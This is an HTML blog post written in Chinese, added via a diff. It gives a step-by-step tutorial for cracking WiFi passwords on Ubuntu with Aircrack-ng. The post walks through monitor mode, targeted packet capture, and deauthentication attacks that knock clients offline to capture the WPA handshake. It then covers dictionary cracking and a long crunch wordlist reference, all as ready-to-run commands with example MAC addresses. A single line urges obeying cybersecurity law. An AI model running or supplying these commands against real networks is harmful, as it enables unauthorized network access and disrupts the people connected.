@@ -1,0 +1,617 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+  <!-- 元数据 -->
+  <meta charset="utf-8">
+  <link rel="icon" href="">
+  <title>Ubuntu18使用Aircrack-ng破解WiFi | 战麟</title>
+  <meta name="author" content="战麟" />
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="robots" content="index,follow" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <meta name="format-detection" content="telphone=no, email=no" />
+  
+    <meta name="keywords" content="Aircrack-ng, Linux, Ubuntu, Wifi破解" />
+  
+  <meta name="description" content="Ubuntu18使用Aircrack-ng破解WiFi">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Ubuntu18使用Aircrack-ng破解WiFi">
+<meta property="og:url" content="http://540060348.github.io/Ubuntu18%E4%BD%BF%E7%94%A8Aircrack-ng%E7%A0%B4%E8%A7%A3WiFi/2021/08/31/index.html">
+<meta property="og:site_name" content="战麟">
+<meta property="og:description" content="Ubuntu18使用Aircrack-ng破解WiFi">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://540060348.github.io/null">
+<meta property="article:published_time" content="2021-08-31T13:48:02.000Z">
+<meta property="article:modified_time" content="2021-09-05T05:36:49.647Z">
+<meta property="article:author" content="战麟">
+<meta property="article:tag" content="Linux">
+<meta property="article:tag" content="Ubuntu">
+<meta property="article:tag" content="Aircrack-ng">
+<meta property="article:tag" content="Wifi破解">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://540060348.github.io/null">
+<meta name="twitter:site" content="@null">
+  
+  <!-- 站点验证相关 -->
+  
+    
+    
+    
+  
+  <!-- 样式表文件 -->
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
+  <link rel="stylesheet" id="kratos-css" href="/css/kratosr.min.css" type="text/css" media="all">
+  
+    <link rel="stylesheet" id="highlight-css" href="/css/highlight/night-eighties.min.css" type="text/css" media="all">
+  
+  
+  <link rel="stylesheet" id="fontawe-css" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" type="text/css" media="all">
+  <link rel="stylesheet" id="nprogress-css" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" type="text/css" media="all">
+  
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css">
+  
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+  
+  
+    <link rel="stylesheet" id="darkmode-css" href="/css/kr-dark.min.css" type="text/css" media="all">
+  
+  <!-- 不得不预先加载的一些JS文件 -->
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+  
+    <script src="https://cdn.jsdelivr.net/npm/qrcode_js@1.0.0/qrcode.min.js"></script>
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+    <body class="custom-background">
+        <div id="kratos-wrapper">
+    <div id="kratos-page">
+        <div id="kratos-header">
+            <header id="kratos-desktop-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="nav-header">
+                        <nav id="kratos-menu-wrap">
+                            <ul id="kratos-primary-menu" class="sf-menu">
+                                
+                                    
+                                        <li><a href="/"><i class="fa fa-home"></i>首页</a></li>
+                                    
+                                
+                                    
+                                        <li><a href="/archives/"><i class="fa fa-file"></i>档案馆</a></li>
+                                    
+                                
+                                    
+                                        <li><a href="/friends/"><i class="fa fa-paw"></i>好伙伴</a></li>
+                                    
+                                
+                                    
+                                        <li>
+                                            <a><i class="fa fa-link"></i>链接</a>
+                                            <ul class="sub-menu">
+                                                
+                                                    
+                                                
+                                                    
+                                                        <li><a href="/%E6%88%98%E9%BA%9F">作者博客</a></li>
+                                                    
+                                                
+                                                    
+                                                        <li><a href="https://540060348.github.io/">项目链接</a></li>
+                                                    
+                                                
+                                            </ul>
+                                        </li>
+                                    
+                                
+                            </ul>
+                        </nav>
+                    </div>
+                </div>
+            </header>
+            <header id="kratos-mobile-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="color-logo"><a href="/">战麟</a></div>
+                    <div class="nav-toggle">
+                        <a class="kratos-nav-toggle js-kratos-nav-toggle">
+                            <i></i>
+                        </a>
+                    </div>
+                </div>
+            </header>
+        </div>
+        <div class="kratos-start kratos-hero-2">
+            <!-- <div class="kratos-overlay"></div> -->
+            <div class="kratos-cover kratos-cover-2 text-center">
+                <div class="desc desc2 animate-box">
+                    <a href="/">
+                        <h2>战麟</h2> <br />
+                        <span>山川异域，不共戴天</span>
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <div id="kratos-blog-post">
+            <div class="container">
+                <div id="main" class="row">
+                    
+
+        
+
+            <section class="col-lg-8 col-md-12">
+
+        
+
+            <article>
+    <div class="kratos-hentry kratos-post-inner clearfix">
+        <header class="kratos-entry-header">
+            
+                <h1 class="kratos-entry-title text-center">Ubuntu18使用Aircrack-ng破解WiFi</h1>
+            
+            
+            <ul class="kratos-post-meta text-center">
+                <li><i class="fa fa-calendar"></i> 2021-08-31</li>
+                <li><i class="fa fa-user"></i> 作者 战麟</li>
+                <li>
+                    <i class="fa fa-edit"></i> 
+                    
+                    
+                        ~4.67K
+                    
+                    字
+                </li>
+                
+            </ul>
+        </header>
+        <div class="kratos-post-content">
+            <div id="expire-alert" class="alert alert-warning hidden" role="alert">
+                本文最后编辑于 <time datetime="1630820209647"></time> 前，其中的内容可能需要更新。
+            </div>
+            
+            <hr />
+            <h1><span id="ubuntu18使用aircrack-ng破解wifi">Ubuntu18使用Aircrack-ng破解WiFi</span></h1><span id="more"></span>
+
+<!-- toc -->
+
+<ul>
+<li><a href="#%E5%8E%9F%E7%90%86">原理</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4">步骤</a><ul>
+<li><a href="#%E5%AE%89%E8%A3%85aircrack-ng">安装Aircrack-ng</a></li>
+<li><a href="#%E7%9B%91%E6%8E%A7%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1">监控无线网卡</a></li>
+<li><a href="#%E6%90%9C%E7%B4%A2wifi">搜索WiFi</a></li>
+<li><a href="#%E6%8A%93%E5%8C%85">抓包</a></li>
+<li><a href="#%E8%A7%A6%E5%8F%91%E9%87%8D%E8%BF%9E">触发重连</a></li>
+<li><a href="#%E8%8E%B7%E5%8F%96%E5%88%B0%E6%8F%A1%E6%89%8B%E5%8C%85">获取到握手包</a></li>
+<li><a href="#%E5%81%9C%E6%AD%A2%E7%9B%91%E6%8E%A7%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1">停止监控无线网卡</a></li>
+<li><a href="#%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81">破解密码</a></li>
+</ul>
+</li>
+<li><a href="#%E5%AF%86%E7%A0%81%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90">密码字典生成</a><ul>
+<li><a href="#%E4%B8%8B%E8%BD%BD%E5%AE%89%E8%A3%85crunch">下载安装crunch</a></li>
+<li><a href="#crunch%E7%94%9F%E6%88%90%E5%AD%97%E5%85%B8">crunch生成字典</a></li>
+<li><a href="#%E6%89%A9%E5%B1%95">扩展</a></li>
+</ul>
+</li>
+</ul>
+<!-- tocstop -->
+
+<p><font color="#ff0000" size="6">请自觉遵守《中华人民共和国网络安全法》及其他法律法规</font></p>
+<h2><span id="原理">原理</span></h2><p>查看连接在目标wifi下的客户端，对其发送断网信号，使其对目标AP发送重连握手包，抓到握手包后，使用密码字典暴力破解</p>
+<h2><span id="步骤">步骤</span></h2><h3><span id="安装aircrack-ng">安装Aircrack-ng</span></h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install aircrack-ng</span><br></pre></td></tr></table></figure>
+
+<p><img src="/Ubuntu18%E4%BD%BF%E7%94%A8Aircrack-ng%E7%A0%B4%E8%A7%A3WiFi/2021/08/31/image-20210831215217098.png" alt="安装aircrack-ng"></p>
+<h3><span id="监控无线网卡">监控无线网卡</span></h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo airmon-ng start &lt;wlan_name&gt;</span><br></pre></td></tr></table></figure>
+
+<p> <code>wlan_name</code> 填写需要使用的无线网卡名称</p>
+<p>示例为：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo airmon-ng start wlxc83a35b0433e</span><br></pre></td></tr></table></figure>
+
+<p><img src="/Ubuntu18%E4%BD%BF%E7%94%A8Aircrack-ng%E7%A0%B4%E8%A7%A3WiFi/2021/08/31/image-20210831222138636.png" alt="监控无线网卡"></p>
+<p><strong>注意：</strong>经过监听无线网卡后，原有无线网卡<code>wlxc83a35b0433e</code> 将被禁用，取而代之的是 <code>wlan0mon</code> ，（运行监听命令后控制台会输出名称）</p>
+<h3><span id="搜索wifi">搜索WiFi</span></h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo airodump-ng &lt;wlan_name&gt;</span><br></pre></td></tr></table></figure>
+
+<p> <code>wlan_name</code> 填写被监控中的无线网卡名称</p>
+<p>示例为：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo airodump-ng wlan0mon</span><br></pre></td></tr></table></figure>
+
+<p><img src="/Ubuntu18%E4%BD%BF%E7%94%A8Aircrack-ng%E7%A0%B4%E8%A7%A3WiFi/2021/08/31/image-20210905123348877.png" alt="搜索wifi"></p>
+<p>获取到目标WiFi的Mac地址后，可以 <code>Ctrl+C</code> 停止</p>
+<h3><span id="抓包">抓包</span></h3><p>打开一个新的控制台</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo airodump-ng -c &lt;Channel&gt; --bssid &lt;WiFi_Mac&gt; -w &lt;file_name&gt; &lt;wlan_name&gt;</span><br></pre></td></tr></table></figure>
+
+<p> <code>Channel</code> 填写需要破解的WiFi的Channel信息</p>
+<p> <code>WiFi_Mac</code> 填写需要破解的WiFi的Mac地址</p>
+<p> <code>file_name</code> 填写生成的抓包文件名称</p>
+<p> <code>wlan_name</code> 填写被监控中的无线网卡名称</p>
+<p>示例为</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo airodump-ng -c 6 --bssid 9E:72:ED:CC:EF:F5 -w wifi wlan0mon</span><br></pre></td></tr></table></figure>
+
+<p><img src="/Ubuntu18%E4%BD%BF%E7%94%A8Aircrack-ng%E7%A0%B4%E8%A7%A3WiFi/2021/08/31/image-20210905123734206.png" alt="抓包"></p>
+<p>此处正在抓包，不要关闭程序</p>
+<h3><span id="触发重连">触发重连</span></h3><p>打开一个新的控制台</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo aireplay-ng -0 2 -a &lt;WiFi_Mac&gt; -c &lt;Station_Mac&gt;  &lt;wlan_name&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>WiFi_Mac</code> 填写 需要破解的WiFi的Mac地址</p>
+<p> <code>file_name</code> 填写生成的抓包文件名称，一般程序会自动在后面加数字</p>
+<p> <code>wlan_name</code> 填写被监控中的无线网卡名称</p>
+<p>发送指令后，客户端掉线会自动发送包含密码信息的重连包</p>
+<p>示例为</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo aireplay-ng -0 2 -a 9E:72:ED:CC:EF:F5 -c F8:5E:A0:04:60:D7 wlan0mon</span><br></pre></td></tr></table></figure>
+
+<p><img src="/Ubuntu18%E4%BD%BF%E7%94%A8Aircrack-ng%E7%A0%B4%E8%A7%A3WiFi/2021/08/31/image-20210905123933325.png" alt="触发重连"></p>
+<h3><span id="获取到握手包">获取到握手包</span></h3><p>在抓包的控制台右上角出现 <code>WAP handshake</code> 字样，即为获取到握手包</p>
+<h3><span id="停止监控无线网卡">停止监控无线网卡</span></h3><p>无线网卡在不需要监控的情况下应该进行停止监控操作</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo airmon-ng stop &lt;wlan_name&gt;</span><br></pre></td></tr></table></figure>
+
+<p> <code>wlan_name</code> 填写被监控中的无线网卡名称</p>
+<p>示例为</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo airmon-ng stop wlan0mon</span><br></pre></td></tr></table></figure>
+
+<p><img src="/Ubuntu18%E4%BD%BF%E7%94%A8Aircrack-ng%E7%A0%B4%E8%A7%A3WiFi/2021/08/31/image-20210905124044912.png" alt="停止监控无线网卡"></p>
+<h3><span id="破解密码">破解密码</span></h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng -w &lt;file_name1&gt; &lt;file_name2&gt;</span><br></pre></td></tr></table></figure>
+
+<p> <code>file_name1</code> 填写字典文件名称，一般会是 <code>.txt</code> 文件</p>
+<p> <code>file_name2</code> 填写获取到握手包的抓包文件名称，一般会是 <code>.cap</code> 文件</p>
+<p>这时，只有安静的等待即可。。。</p>
+<p>示例为</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng -w password.txt wifi-01.cap</span><br></pre></td></tr></table></figure>
+
+<p><img src="/Ubuntu18%E4%BD%BF%E7%94%A8Aircrack-ng%E7%A0%B4%E8%A7%A3WiFi/2021/08/31/image-20210905130114938.png" alt="破解密码"></p>
+<p>WiFi加密方式为WEP加密方式的密码可以直接跑出来，WPA/WPA2加密方式的密码没跑出来(╥_╥)</p>
+<h2><span id="密码字典生成">密码字典生成</span></h2><h3><span id="下载安装crunch">下载安装crunch</span></h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install crunch </span><br></pre></td></tr></table></figure>
+
+<p><img src="/Ubuntu18%E4%BD%BF%E7%94%A8Aircrack-ng%E7%A0%B4%E8%A7%A3WiFi/2021/08/31/image-20210905093829717.png" alt="安装crunch"></p>
+<h3><span id="crunch生成字典">crunch生成字典</span></h3><p>生成8位数字密码字典</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch 8 8 0123456789 &gt;&gt; password.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/Ubuntu18%E4%BD%BF%E7%94%A8Aircrack-ng%E7%A0%B4%E8%A7%A3WiFi/2021/08/31/image-20210905095835954.png" alt="crunch生成字典"></p>
+<h3><span id="扩展">扩展</span></h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">crunch 1 8 </span><br><span class="line"><span class="comment">#生成最小1位，最大8位，由26个小写字母为元素的所有组合 </span></span><br><span class="line">crunch 1 6 abcdefg </span><br><span class="line"><span class="comment">#生成 最小为1,最大为6.由abcdefg为元素的所有组合 </span></span><br><span class="line">crunch 1 6 abcdefg\ </span><br><span class="line"><span class="comment">#生成 最小为1,最大为6.由abcdefg和空格为元素的所有组合（/代表空格） </span></span><br><span class="line">crunch 1 8 -f charset.lst mixalpha-numeric-all-space -o wordlist.txt </span><br><span class="line"><span class="comment">#调用密码库 charset.lst， 生成最小为1，最大为8,元素为密码库 charset.lst中 mixalpha-numeric-all-space的项目，并保存为 wordlist.txt；其中 charset.lst在kali_linux的目录为 /usr/share/crunch/charset.lst， charset.lst中 mixalpha-numeric-all-space项目包含最常见的元素组合（即大小写字母+数字+常见符号） </span></span><br><span class="line">crunch 8 8 -f charset.lst mixalpha-numeric-all-space -o wordlist.txt -t @@dog @@@ -s cbdogaaa </span><br><span class="line"><span class="comment">#调用密码库 charset.lst，生成8位密码；其中元素为 密码库 charset.lst中 mixalpha-numeric-all-space的项；格式为“两个小写字母+dog+三个小写字母”，并以cbdogaaa开始枚举（@代表小写字母） </span></span><br><span class="line">crunch 2 3 -f charset.lst ualpha -s BB </span><br><span class="line"><span class="comment">#调用密码库charset.lst，生成2位和3位密码；其中元素为密码库charset.lst中ualpha的项；并且以BB开头 </span></span><br><span class="line">crunch 4 5 -p abc </span><br><span class="line"><span class="comment">#crunch将会生成abc, acb, bac, bca, cab, cba，虽然数字4和5这里没用，但必须有 </span></span><br><span class="line">crunch 4 5 -p dog cat bird </span><br><span class="line"><span class="comment">#crunch将生成以“dog”“cat”“bird”为元素的所有密码组合：birdcatdog，birddogcat，catbirddog, catdogbird, dogbirdcat, dogcatbird </span></span><br><span class="line">crunch 1 5 -o START -c 6000 -z bzip2 </span><br><span class="line"><span class="comment"># 生成最小为1位，最大为5位元素为所有小写字母的密码字典，其中每一个字典文件包含6000个密码，并将密码文件保存为bz2文件，文件名将以 &quot;第一个密码&quot; + &quot; - &quot; + &quot;最后一个密码&quot; + &quot; .txt.bz2 &quot; 保存（比如000-999.txt.bz2）；下面是生成几种格式的压缩文件所用的时间和体积大小对比： </span></span><br><span class="line">crunch 4 5 -b 20mib -o START </span><br><span class="line"><span class="comment"># 生成最小为4位，最大为5位元素为所有小写字母的密码字典，并以20M进行分割；这时会生成4个文件：aaaa-gvfed.txt, gvfee-ombqy.txt, ombqz-wcydt.txt, wcydu-zzzzz.txt：其中前三个大概每个20M，最后一个10M左右（因为总共70M） </span></span><br><span class="line">crunch 4 4 + + 123 + -t %%@^ </span><br><span class="line"><span class="comment">#生成4位密码，其中格式为“两个数字”+“一个小写字母”+“常见符号”（其中数字这里被指定只能为123组成的所有2位数字组合）。比如12f# 32j^ 13t$ ...... </span></span><br><span class="line">crunch 3 3 abc + 123 @<span class="comment">#! -t @%^ </span></span><br><span class="line"><span class="comment">#生成3位密码，其中第一位由“a，b，c”中的一个；第二位为“1,2,3”中的一个；第三位为“！，@，#”中的一个。比如1a！ 2a# 3b@ ...... </span></span><br><span class="line">crunch 3 3 abc + 123 @<span class="comment">#! -t ^%@ </span></span><br><span class="line"><span class="comment">#生成3位密码，其中格式为“字符+数字+字母”，这里字符范围为！@# ，数字范围为 1 2 3 , 字母范围为a b c比如！1c @3b @2a ...... </span></span><br><span class="line">crunch 5 5 -t ddd@@ -p dog cat bird </span><br><span class="line"><span class="comment">#生成5个元素组成的密码，其中前三个为 dog cat bird任意组合，后两个为两个小写字母的任意组合。比如birddogcatuz catdogbirdab birdcatdogff ...... </span></span><br><span class="line">crunch 7 7 -t p@ss,%^ -l a@aaaaa </span><br><span class="line"><span class="comment">#生成7位密码，格式为“字符p@ss”+大写字母+数字+符号 比如 p@ssZ9&gt; ...... </span></span><br><span class="line">crunch 5 5 -s @4<span class="comment">#S2 -t @%^,% -e @8 Q2 -l @dddd -b 10KB -o START </span></span><br><span class="line"><span class="comment">#生成5位密码，格式为小写字母+数字+符号+大写字母+数字，并以 @4#S2开始，分割为10k大小。。。 </span></span><br><span class="line">crunch 5 5 -d 2@ -t @@@%% </span><br><span class="line"><span class="comment">#生成5位密码，格式为三个字母+两个数字，并限制每个密码最少出现2种字母 </span></span><br><span class="line">crunch 10 10 -t @@@^%%%%^^ -d 2@ -d 3% -b 20mb -o START </span><br><span class="line"><span class="comment">#生成10位密码，格式为三个小写字母+一个符号+四个数字+两个符号，限制每个密码至少2种字母和至少3种数字 </span></span><br><span class="line">crunch 8 8 -d 2@ </span><br><span class="line"><span class="comment">#生成8位密码，每个密码至少出现两种字母 </span></span><br><span class="line">crunch 4 4 -f unicode_test.lst the-greeks -t @@%% -l @xdd </span><br><span class="line"><span class="comment">#调用密码库 unicode_test.lst中的 the-greeks项目字符，生成4位密码，其中格式为两小写字母+两数字，同样kali_linux中 unicode_test.lst 在/usr/share/crunch目录 </span></span><br><span class="line">-b <span class="comment">#体积大小，比如后跟20mib </span></span><br><span class="line">-c <span class="comment">#密码个数（行数），比如8000 </span></span><br><span class="line">-d <span class="comment">#限制出现相同元素的个数（至少出现元素个数），-d 3就不会出现zzf ffffgggg之类的 </span></span><br><span class="line">-e <span class="comment">#定义停止生成密码 ，比如-e 222222：到222222停止生成密码 </span></span><br><span class="line">-f <span class="comment">#调用密码库文件，比如/usr/share/crunch/charset.lst </span></span><br><span class="line">-i <span class="comment">#改变输出格式 </span></span><br><span class="line">-l <span class="comment">#与-t搭配使用 </span></span><br><span class="line">-m <span class="comment">#与-p搭配使用 </span></span><br><span class="line">-o <span class="comment">#保存为 </span></span><br><span class="line">-p <span class="comment">#定义密码元素 </span></span><br><span class="line">-q <span class="comment">#读取字典 </span></span><br><span class="line">-r <span class="comment">#定义从某一个地方重新开始 </span></span><br><span class="line">-s <span class="comment">#第一个密码，从xxx开始 </span></span><br><span class="line">-t <span class="comment">#定义输出格式 </span></span><br><span class="line">@代表小写字母 </span><br><span class="line">，代表大写字母 </span><br><span class="line">   </span><br><span class="line">%代表数字 </span><br><span class="line">   </span><br><span class="line">^代表符号 </span><br><span class="line">-z <span class="comment">#打包压缩，格式支持 gzip, bzip2, lzma, 7z</span></span><br></pre></td></tr></table></figure>
+
+
+        </div>
+        
+        <footer class="kratos-entry-footer clearfix">
+            
+                <div class="post-like-donate text-center clearfix" id="post-like-donate">
+                
+                    <a class="donate" href="javascript:;"><i class="fa fa-bitcoin"></i> 打赏</a>
+                
+                
+                    <a class="share" href="javascript:;"><i class="fa fa-share-alt"></i> 分享</a>
+                    <div class="share-wrap" style="display: none;">
+    <div class="share-group">
+        <a href="javascript:;" class="share-plain qq" onclick="share('qq');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-qq"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain qzone" onclick="share('qzone');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-star"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weixin pop style-plain" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weixin"></i>
+            </div>
+            <div class="share-int">
+                <div class="qrcode" id="wechat-qr"></div>
+                <p>打开微信“扫一扫”，打开网页后点击屏幕右上角分享按钮</p>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weibo" onclick="share('weibo');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weibo"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain facebook style-plain" onclick="share('facebook');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-facebook"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain twitter style-plain" onclick="share('twitter');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-twitter"></i>
+            </div>
+        </a>
+    </div>
+    <script type="text/javascript">
+        $(()=>{
+            new QRCode("wechat-qr", {
+                text: "http://540060348.github.io/Ubuntu18%E4%BD%BF%E7%94%A8Aircrack-ng%E7%A0%B4%E8%A7%A3WiFi/2021/08/31/",
+                width: 150,
+                height: 150,
+                correctLevel : QRCode.CorrectLevel.H
+            });
+        });
+        function share(dest) {
+            const qqBase        = "https://connect.qq.com/widget/shareqq/index.html?";
+            const weiboBase     = "https://service.weibo.com/share/share.php?";
+            const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
+            const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
+            const twitterBase   = "https://twitter.com/intent/tweet?";
+            const hostUrl       = "http://540060348.github.io/Ubuntu18%E4%BD%BF%E7%94%A8Aircrack-ng%E7%A0%B4%E8%A7%A3WiFi/2021/08/31/";
+            const title         = "「Ubuntu18使用Aircrack-ng破解WiFi」";
+            const excerpt       = `Ubuntu18使用Aircrack-ng破解WiFi`;
+            let _URL;
+            switch (dest) {
+                case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
+                case "weibo"    : _URL = weiboBase+"url="+hostUrl+"&title="+title+excerpt;                                 break;
+                case "qzone"    : _URL = qzoneBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";  break;
+                case "facebook" : _URL = facebookBase+"u="+hostUrl;                                                        break;
+                case "twitter"  : _URL = twitterBase+"text="+title+excerpt+"&url="+hostUrl;                                break;
+            }
+            window.open(_URL);
+        };
+    </script>
+</div>
+                
+                </div>
+            
+            <div class="footer-tag clearfix">
+                <div class="pull-left">
+                <i class="fa fa-tags"></i>
+                    <a class="tag-none-link" href="/tags/Aircrack-ng/" rel="tag">Aircrack-ng</a>, <a class="tag-none-link" href="/tags/Linux/" rel="tag">Linux</a>, <a class="tag-none-link" href="/tags/Ubuntu/" rel="tag">Ubuntu</a>, <a class="tag-none-link" href="/tags/Wifi%E7%A0%B4%E8%A7%A3/" rel="tag">Wifi破解</a>
+                </div>
+                <div class="pull-date">
+                <span>最后编辑：2021-09-05</span>
+                </div>
+            </div>
+        </footer>
+    </div>
+    
+        <nav class="navigation post-navigation clearfix" role="navigation">
+            
+            <div class="nav-previous clearfix">
+                <a title=" 身份证号码算法" href="/身份证号码算法/2021/08/22/">&lt; 上一篇</a>
+            </div>
+            
+            
+            <div class="nav-next clearfix">
+                <a title=" Ubuntu18修改网卡Mac地址" href="/Ubuntu18修改网卡Mac地址/2021/09/05/">下一篇 &gt;</a>
+            </div>
+            
+        </nav>
+    
+    
+</article>
+
+        
+
+            </section>
+
+        
+
+                
+            
+
+<section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
+    <!-- 文章和页面根据splitter来分割，没有的话就从头开始设置为sticky -->
+    
+    
+                <aside id="krw-about" class="widget widget-kratos-about clearfix">
+    <div class="photo-background"></div>
+    <div class="photo-wrapper clearfix">
+        <div class="photo-wrapper-tip text-center">
+            <img class="about-photo" src="/images/touxiang.webp" />
+        </div>
+    </div>
+    <div class="textwidget">
+        <p class="text-center">做个俗人，贪财好色</p>
+    </div>
+</aside>
+            
+                    <div class="sticky-area">
+                
+                
+
+            
+                
+  <aside id="krw-tags" class="widget widget-kratos-tags clearfix">
+    <h4 class="widget-title"><i class="fa fa-tags"></i>标签聚合</h4>
+      <div class="tag-clouds">
+        <a href="/tags/Aircrack-ng/" style="font-size: 0.6em;">Aircrack-ng</a> <a href="/tags/Hexo/" style="font-size: 0.7em;">Hexo</a> <a href="/tags/Linux/" style="font-size: 0.8em;">Linux</a> <a href="/tags/Python/" style="font-size: 0.65em;">Python</a> <a href="/tags/Qt/" style="font-size: 0.6em;">Qt</a> <a href="/tags/ROS/" style="font-size: 0.75em;">ROS</a> <a href="/tags/Ubuntu/" style="font-size: 0.7em;">Ubuntu</a> <a href="/tags/VM/" style="font-size: 0.6em;">VM</a> <a href="/tags/Wifi%E7%A0%B4%E8%A7%A3/" style="font-size: 0.6em;">Wifi破解</a> <a href="/tags/git/" style="font-size: 0.6em;">git</a> <a href="/tags/%E4%B8%B2%E5%8F%A3/" style="font-size: 0.6em;">串口</a> <a href="/tags/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/" style="font-size: 0.6em;">微信小程序</a> <a href="/tags/%E6%A0%91%E8%8E%93%E6%B4%BE/" style="font-size: 0.6em;">树莓派</a> <a href="/tags/%E7%A1%AC%E4%BB%B6/" style="font-size: 0.6em;">硬件</a> <a href="/tags/%E7%AE%97%E6%B3%95/" style="font-size: 0.6em;">算法</a> <a href="/tags/%E8%BD%AF%E4%BB%B6%E6%B8%85%E5%8D%95/" style="font-size: 0.6em;">软件清单</a>
+      </div>
+  </aside>
+
+            
+                
+  <aside id="krw-posts" class="widget widget-kratos-posts">
+  <h4 class="widget-title"><i class="fa fa-file"></i>最新文章</h4>
+  <div class="tab-content">
+      <ul class="list-group">
+        
+        
+          
+          
